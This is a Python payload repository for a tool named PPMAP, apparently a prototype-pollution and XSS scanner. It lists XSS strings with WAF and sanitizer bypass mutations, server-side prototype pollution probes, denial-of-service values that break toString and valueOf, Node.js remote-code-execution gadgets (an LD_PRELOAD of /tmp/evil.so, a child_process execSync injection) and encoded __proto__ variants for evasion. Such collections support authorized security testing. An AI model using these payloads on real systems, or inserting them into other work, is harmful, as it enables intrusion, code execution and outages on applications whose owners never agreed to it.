"""
Advanced Payload Repository for PPMAP v4.2.1.
Categorized and mutated for maximum WAF evasion and coverage.
"""

QUICK_POC_PAYLOADS = [
    {"__proto__": {"ppmap_poc": "confirmed"}},
    {"constructor": {"prototype": {"ppmap_poc": "confirmed"}}},
]

# Client-Side XSS Gadgets & Bypasses
XSS_PAYLOADS = [
    # Basic
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    
    # WAF Bypass mutations
    '<details open ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src x onerror=alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    
    # Sanitizer Bypasses (DOMPurify, etc.)
    '<img src=x data-allowed-attr=onerror payload=alert(1)>',
    
    # Unicode / Encoding
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    '%253cscript%253ealert(1)%253c/script%253e',
]

# Server-Side Prototype Pollution (SSPP) / Blind Detection Sinks
SSPP_PAYLOADS = [
    # Discovery
    {"__proto__": {"ppmap": "polluted"}},
    {"constructor": {"prototype": {"ppmap": "polluted"}}},
    
    # Blind: JSON Spaces (Express/Fastify)
    {"__proto__": {"json spaces": 10}},
    {"__proto__": {"json_spaces": 10}},
    
    # Blind: Status Code Override
    {"__proto__": {"status": 510}},
    {"__proto__": {"statusCode": 510}},
    
    # Blind: Charset Override
    {"__proto__": {"content-type": "text/html;charset=utf-7"}},
    
    # Denial of Service (DoS)
    {"__proto__": {"toString": "not_a_function"}},
    {"__proto__": {"valueOf": "not_a_function"}},
]

# Remote Code Execution (RCE) Gadgets (Node.js)
RCE_PAYLOADS = [
    {"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}},
    {"__proto__": {"env": {"LD_PRELOAD": "/tmp/evil.so"}}},  # nosec B108
    {"__proto__": {"argv0": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}},
    {"__proto__": {"ssrCssVars": "1}; return process.mainModule.require('child_process').execSync('id')//"}},
]

# Advanced Mutation Logic for Evasion (Keys and Values)
MUTATION_VECTORS = [
    "__proto__",
    "constructor[prototype]",
    "__proto__.__proto__",
    "__\u0070\u0072\u006f\u0074\u006f__",
    "\\u005f\\u005fproto\\u005f\\u005f",
]

DEFAULT_XSS_PARAMS = ["q", "search", "query", "id", "name", "s", "input"]
